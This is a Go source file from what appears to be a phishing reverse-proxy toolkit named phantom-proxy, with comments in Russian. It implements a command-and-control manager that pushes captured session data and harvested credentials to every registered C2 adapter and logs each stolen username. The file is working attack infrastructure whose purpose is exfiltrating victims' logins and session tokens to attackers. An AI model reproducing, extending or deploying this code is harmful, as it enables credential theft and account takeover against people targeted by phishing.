// Package c2 - C2 Integration Manager
package c2

import (
	"context"
	"sync"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"go.uber.org/zap"
)



// Manager менеджер C2
type Manager struct {
	mu        sync.RWMutex
	logger    *zap.Logger
	adapters  []Adapter
	enabled   bool
}

// NewManager создает C2 менеджер
func NewManager(logger *zap.Logger, adapters []Adapter) *Manager {
	return &Manager{
		logger:   logger,
		adapters: adapters,
		enabled:  true,
	}
}

// AddAdapter добавляет адаптер
func (m *Manager) AddAdapter(adapter Adapter) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.adapters = append(m.adapters, adapter)
	m.logger.Info("C2 adapter added", zap.String("name", adapter.Name()))
}

// SendSession отправляет сессию во все C2
func (m *Manager) SendSession(ctx context.Context, data *SessionData) error {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if !m.enabled {
		return nil
	}

	for _, adapter := range m.adapters {
		if adapter.IsAvailable(ctx) {
			if err := adapter.SendSession(ctx, data); err != nil {
				m.logger.Warn("Failed to send session to C2",
					zap.String("adapter", adapter.Name()),
					zap.Error(err))
			} else {
				m.logger.Info("Session sent to C2",
					zap.String("adapter", adapter.Name()),
					zap.String("session", data.SessionID))
			}
		}
	}

	return nil
}

// SendCredentials отправляет креденшалы во все C2
func (m *Manager) SendCredentials(ctx context.Context, creds *database.Credentials, metadata map[string]string) error {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if !m.enabled {
		return nil
	}

	for _, adapter := range m.adapters {
		if adapter.IsAvailable(ctx) {
			if err := adapter.SendCredentials(ctx, creds, metadata); err != nil {
				m.logger.Warn("Failed to send credentials to C2",
					zap.String("adapter", adapter.Name()),
					zap.Error(err))
			} else {
				m.logger.Info("Credentials sent to C2",
					zap.String("adapter", adapter.Name()),
					zap.String("username", creds.Username))
			}
		}
	}

	return nil
}

// HealthCheck проверяет все C2
func (m *Manager) HealthCheck(ctx context.Context) map[string]bool {
	m.mu.RLock()
	defer m.mu.RUnlock()

	results := make(map[string]bool)
	for _, adapter := range m.adapters {
		results[adapter.Name()] = adapter.IsAvailable(ctx)
	}

	return results
}

// ListAdapters возвращает список адаптеров
func (m *Manager) ListAdapters() []string {
	m.mu.RLock()
	defer m.mu.RUnlock()

	names := make([]string, len(m.adapters))
	for i, adapter := range m.adapters {
		names[i] = adapter.Name()
	}
	return names
}




